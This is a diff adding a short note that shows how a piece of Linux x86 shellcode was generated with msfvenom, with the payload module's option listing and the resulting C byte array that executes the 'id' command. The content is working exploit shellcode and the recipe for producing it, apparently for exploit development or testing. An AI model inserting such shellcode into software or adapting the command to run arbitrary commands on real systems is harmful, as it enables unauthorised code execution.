@@ -1,0 +1,62 @@
+The shellcode was created with the following command line:
+
+$ msfvenom -p linux/x86/exec CMD=id -f c
+
+Options for payload/linux/x86/exec:
+=========================
+
+
+       Name: Linux Execute Command
+     Module: payload/linux/x86/exec
+   Platform: Linux
+       Arch: x86
+Needs Admin: No
+ Total size: 36
+       Rank: Normal
+
+Provided by:
+    vlad902 <vlad902@gmail.com>
+
+Basic options:
+Name  Current Setting  Required  Description
+----  ---------------  --------  -----------
+CMD                    yes       The command string to execute
+
+Description:
+  Execute an arbitrary command
+
+
+
+Advanced options for payload/linux/x86/exec:
+=========================
+
+    Name                Current Setting  Required  Description
+    ----                ---------------  --------  -----------
+    AppendExit          false            no        Append a stub that executes the exit(0) system call
+    PrependChrootBreak  false            no        Prepend a stub that will break out of a chroot (includes setreuid to root)
+    PrependFork         false            no        Prepend a stub that executes: if (fork()) { exit(0); }
+    PrependSetgid       false            no        Prepend a stub that executes the setgid(0) system call
+    PrependSetregid     false            no        Prepend a stub that executes the setregid(0, 0) system call
+    PrependSetresgid    false            no        Prepend a stub that executes the setresgid(0, 0, 0) system call
+    PrependSetresuid    false            no        Prepend a stub that executes the setresuid(0, 0, 0) system call
+    PrependSetreuid     false            no        Prepend a stub that executes the setreuid(0, 0) system call
+    PrependSetuid       false            no        Prepend a stub that executes the setuid(0) system call
+    VERBOSE             false            no        Enable detailed status messages
+    WORKSPACE                            no        Specify the workspace for this module
+
+Evasion options for payload/linux/x86/exec:
+=========================
+
+    Name  Current Setting  Required  Description
+    ----  ---------------  --------  -----------
+root@kaliVM:/usr/bin# msfvenom -p linux/x86/exec CMD=id -f c
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 38 bytes
+Final size of c file: 185 bytes
+unsigned char buf[] = 
+"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68"
+"\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x03\x00\x00\x00\x69"
+"\x64\x00\x57\x53\x89\xe1\xcd\x80";
+
